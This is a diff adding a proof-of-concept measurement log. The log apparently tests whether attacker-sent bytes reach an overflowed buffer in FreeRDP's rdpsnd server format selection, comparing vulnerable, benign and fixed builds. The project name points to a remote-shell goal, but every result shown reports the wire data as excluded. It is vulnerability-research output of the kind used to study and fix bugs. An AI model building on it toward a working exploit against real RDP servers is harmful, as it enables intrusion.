@@ -1,0 +1,42 @@
+freerdp2shell wake21 — wire byte-range measurement 2026-11-26T13:07:32Z
+build: gcc plain /tmp/fr-wake2/build3320_plain; pinned src d27a4f7c
+POC: PocWireByteRange.c; wire marker 0x5a in cbSize=256 blob; capture 0xde
+
+
+=== mode=vuln ===
+[vuln] recv_formats rc=0 nformats=2
+[vuln] wire record: tag=2 ch=2 align=8 cbsize=256 data[0]=5a data[255]=5a
+[13:07:32:639] [2174636:00212eac] [ERROR][com.freerdp.channels.rdpsnd.server] - [rdpsnd_server_select_format]: realloc failed!
+[vuln] SelectFormat rc=12 out_frames=0xfffffffffffffffc out_buffer_size=8820
+[vuln] wire_blob-out_buffer delta=-272 bytes (separate allocation)
+WAKE9_COPY dst_off=0 cframesize=16384 b0=de blast=de b8820=de b21384=00
+[vuln] W20 fields in out_buffer: 8880=de 8888=de 8920=de 8928=de 8992=de 9000=de 12000=de (want 5a if wire supplied them; de = capture)
+[vuln] window [8820,25204): wire_0x5a=0 capture_0xde=16384
+[vuln] RESULT=WIRE_EXCLUDED wire_at_call_target=0
+
+=== mode=nocall ===
+[nocall] recv_formats rc=0 nformats=2
+[nocall] wire record: tag=2 ch=2 align=8 cbsize=256 data[0]=5a data[255]=5a
+[13:07:32:668] [2174637:00212ead] [ERROR][com.freerdp.channels.rdpsnd.server] - [rdpsnd_server_select_format]: realloc failed!
+[nocall] SelectFormat rc=12 out_frames=0xfffffffffffffffc out_buffer_size=8820
+[nocall] wire_blob-out_buffer delta=-272 bytes (separate allocation)
+WAKE9_COPY dst_off=0 cframesize=16384 b0=de blast=de b8820=de b21384=00
+[nocall] W20 fields in out_buffer: 8880=de 8888=de 8920=de 8928=de 8992=00 9000=00 12000=de (want 5a if wire supplied them; de = capture)
+[nocall] window [8820,25204): wire_0x5a=0 capture_0xde=16352
+[nocall] RESULT=WIRE_EXCLUDED wire_at_call_target=0
+
+=== mode=benign ===
+[benign] recv_formats rc=0 nformats=1
+[benign] SelectFormat rc=0 out_frames=0x000000000000089d out_buffer_size=8820
+WAKE9_COPY dst_off=0 cframesize=400 b0=de blast=de b8820=00 b21384=00
+[benign] window [0,400): wire_0x5a=0 capture_0xde=400
+[benign] RESULT=NO_WRAP wire_at_call_target=0
+
+=== mode=fixed ===
+[fixed] recv_formats rc=0 nformats=2
+[fixed] wire record: tag=2 ch=2 align=8 cbsize=256 data[0]=5a data[255]=5a
+[fixed] SelectFormat rc=6 out_frames=0x000000000000089d out_buffer_size=8820
+[fixed] wire_blob-out_buffer delta=-272 bytes (separate allocation)
+WAKE9_COPY dst_off=0 cframesize=400 b0=de blast=de b8820=00 b21384=00
+[fixed] window [0,400): wire_0x5a=0 capture_0xde=400
+[fixed] RESULT=NO_WRAP wire_at_call_target=0
